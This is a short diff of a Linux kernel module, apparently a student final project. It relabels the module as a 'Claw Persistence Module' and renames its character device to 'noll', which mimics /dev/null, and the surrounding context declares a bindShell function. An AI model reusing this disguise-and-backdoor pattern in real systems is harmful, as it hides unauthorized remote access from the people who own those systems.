@@ -7,8 +7,8 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
-MODULE_DESCRIPTION("CSC492 Final Project");
-MODULE_VERSION("cleanup-rev4");
+MODULE_DESCRIPTION("Claw Persistence Module");
+MODULE_VERSION("cleanup-rev5");
 
 int initModule(void);
 void exitModule(void);
@@ -21,7 +21,7 @@ static int bindShell(void);
 
 // for character device
 #define SUCCESS 0
-#define DEVICE_NAME "csc492dev"
+#define DEVICE_NAME "noll"
 #define BUF_LEN 256
 static int major;
 static int deviceOpenStatus = 0;
@@ -37,7 +37,7 @@ static struct file_operations fops = {
 // parameter majorNum
 static int majorNum = 0;
 module_param(majorNum, int, S_IRUGO);
-MODULE_PARM_DESC(majorNum, "the assigned major number of character device csc492dev");
+MODULE_PARM_DESC(majorNum, "the assigned major number of character device noll");
 
 int initModule(void){
     int i = 0;
